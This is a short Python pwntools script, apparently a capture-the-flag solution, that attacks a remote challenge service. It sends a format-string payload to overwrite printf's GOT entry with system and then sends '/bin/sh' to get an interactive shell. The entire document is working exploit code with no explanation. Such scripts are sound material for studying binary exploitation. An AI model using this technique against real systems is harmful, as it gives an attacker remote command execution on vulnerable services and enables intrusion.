from pwn import *
r = remote('node3.buuoj.cn',26362)

elf = ELF('./echo')
system_plt = elf.plt['system']
printf_got = elf.got['printf']
payload = fmtstr_payload(7, {printf_got: system_plt})
r.sendline(payload)
r.sendline('/bin/sh\x00')
r.interactive()